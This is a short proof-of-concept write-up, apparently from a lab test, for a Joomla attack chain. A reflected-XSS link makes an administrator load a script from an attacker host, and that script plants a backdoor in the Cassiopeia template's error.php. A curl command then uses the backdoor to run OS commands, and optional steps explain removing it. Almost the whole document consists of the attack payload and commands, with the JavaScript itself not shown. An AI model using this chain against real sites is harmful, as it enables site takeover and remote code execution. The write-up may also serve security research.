# [RCE] Patch File

## Test Environment

### Web Browsers (20240224)

* [x] Mozilla Firefox Version 123.0 (64-bit)
* [x] Google Chrome Version 122.0.6261.70 (64-bit)
* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)

## Exploitation Steps

1. victim user (with administrative privileges) logs in

http://192.168.5.19/administrator

2. victim user clicks link

```
http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.13/patchFileJoomla.js></script>
```

3. execute OS command

```
curl "http://192.168.5.19/templates/cassiopeia/error.php?pass=test&cmd=id"
```

4. [optional] restore file

*Joomla -> System -> [Templates] Site Templates -> Cassiopeia Details and Files -> [tab] Editor -> /templlates/cassiopeia - error.php -> (remove backdoor) -> Save & Close*

## Screenshots

![Image](screenshots/Joomla_-_patch_file_-_1-1.png)
